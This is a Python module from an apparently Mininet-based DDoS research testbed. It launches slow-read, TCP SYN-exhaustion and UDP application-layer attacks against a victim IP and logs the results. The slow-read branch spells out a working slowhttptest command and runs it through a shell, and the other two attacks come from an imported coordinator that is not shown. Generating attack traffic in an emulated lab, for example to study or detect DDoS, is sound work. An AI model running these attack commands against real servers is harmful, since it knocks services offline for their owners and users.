"""
Refactored Advanced Adversarial DDoS Attacks Module

This module provides the main entry point for executing advanced adversarial DDoS attacks
with improved modularity and maintainability.
"""

import os
import re
import time
import signal
import logging
import subprocess
import uuid
from pathlib import Path

try:
    from .ddos_coordinator import AdvancedDDoSCoordinator
except ImportError:
    from ddos_coordinator import AdvancedDDoSCoordinator

# Import standardized logging
try:
    from ..utils.logger import get_attack_logger, with_run_id
except ImportError:
    try:
        from utils.logger import get_attack_logger, with_run_id
    except ImportError:
        # Fallback to basic logging
        def get_attack_logger(log_dir=None):
            return logging.getLogger('attack_logger')
        def with_run_id(run_id, logger):
            class MockContext:
                def __enter__(self): return logger
                def __exit__(self, *args): pass
            return MockContext()


def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", output_dir=None):
    """
    Execute advanced adversarial DDoS attacks against a target.
    
    Args:
        attacker_host: Mininet host object for the attacker
        victim_ip: Target IP address
        duration: Attack duration in seconds
        attack_variant: Type of attack ("slow_read", "ad_syn", "ad_udp")
        output_dir: Directory for output logs
    
    Returns:
        subprocess.Popen or None: Process object for slow_read attacks, None for others
    """
    run_id = str(uuid.uuid4())  # Generate a unique ID for this attack run
    
    # Get standardized attack logger
    attack_logger = get_attack_logger(Path(output_dir) if output_dir else None)
    
    # Use run context for consistent run ID logging
    with with_run_id(run_id, attack_logger) as logger:
        logger.info(f"[{attack_variant}] Starting advanced adversarial attack against {victim_ip} for {duration} seconds.")
    coordinator = AdvancedDDoSCoordinator(victim_ip)

    attack_results = {}  # Dictionary to store results for summary

    if attack_variant == "slow_read":
        # Slow read attack using slowhttptest
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Adversarial Slow Read - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
        slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Executing slowhttptest command: {slowhttptest_cmd}")
        
        process = attacker_host.popen(slowhttptest_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        
        try:
            if process.poll() is None:
                process.send_signal(signal.SIGINT)
                attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Sent SIGINT to slowhttptest process {process.pid}")
                time.sleep(1) 
        except Exception as e:
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error sending SIGINT to slowhttptest: {e}")
        
        if process.poll() is None:
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
            process.terminate()
            time.sleep(1)
        
        stdout, stderr = process.communicate()
        stdout_str = stdout.decode().strip()
        stderr_str = stderr.decode().strip()

        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- slowhttptest Summary ---")
        
        # Parse slowhttptest output
        exit_status_match = re.search(r"Exit Status: (\\d+)", stdout_str)
        pending_match = re.search(r"pending connections:\\s*(\\d+)", stdout_str)
        connected_match = re.search(r"connected connections:\\s*(\\d+)", stdout_str)
        closed_match = re.search(r"closed connections:\\s*(\\d+)", stdout_str)
        error_match = re.search(r"error connections:\\s*(\\d+)", stdout_str)
        
        if exit_status_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Exit Status: {exit_status_match.group(1)}")
        if pending_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Pending Connections: {pending_match.group(1)}")
        if connected_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connected Connections: {connected_match.group(1)}")
        if closed_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Closed Connections: {closed_match.group(1)}")
        if error_match:
            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Error Connections: {error_match.group(1)}")

        # Calculate and log total connections attempted and successful connections
        pending = int(pending_match.group(1)) if pending_match else 0
        connected = int(connected_match.group(1)) if connected_match else 0
        closed = int(closed_match.group(1)) if closed_match else 0
        errors = int(error_match.group(1)) if error_match else 0
        
        total_connections_attempted = pending + connected + closed + errors
        successful_connections = connected
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total Connections Attempted: {total_connections_attempted}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Successful Connections: {successful_connections}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stdout: {stdout_str}")

        if stderr_str:
            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stderr: {stderr_str}")
        
        exit_code = process.returncode
        if exit_code != 0:
            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process exited with non-zero code: {exit_code}")
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------------")
        attack_results[attack_variant] = {
            "status": "completed",
            "exit_code": exit_code,
            "stdout_summary": {
                "exit_status": exit_status_match.group(1) if exit_status_match else "N/A",
                "pending": pending_match.group(1) if pending_match else "N/A",
                "connected": connected_match.group(1) if connected_match else "N/A",
                "closed": closed_match.group(1) if closed_match else "N/A",
                "errors": error_match.group(1) if error_match else "N/A",
                "total_attempted": total_connections_attempted,
                "successful": successful_connections,
            },
            "stderr": stderr_str
        }
        return process
        
    elif attack_variant == "ad_syn":
        # Advanced TCP SYN attack
        results = coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
        attack_results[attack_variant] = results
        
    elif attack_variant == "ad_udp":
        # Advanced UDP application layer attack
        results = coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
        attack_results[attack_variant] = results
        
    else:
        attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Unknown attack variant: {attack_variant}. No specific attack executed.")
        attack_results[attack_variant] = {"status": "unknown_variant", "message": "No specific attack executed for this variant."}
        return None
    
    # Final summary for ad_syn and ad_udp
    if attack_variant in ["ad_syn", "ad_udp"] and attack_results.get(attack_variant):
        summary = attack_results[attack_variant]
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- Attack Summary ---")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total {summary.get('type', 'packets/requests')} sent: {summary.get('total_sent', 0)}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Average rate: {summary.get('average_rate', 0):.2f} {summary.get('type', 'packets/requests')}/sec")
        if summary.get('warning_message'):
            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Warning: {summary['warning_message']}")
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------")
    
    return None  # For ad_syn and ad_udp, no direct process to return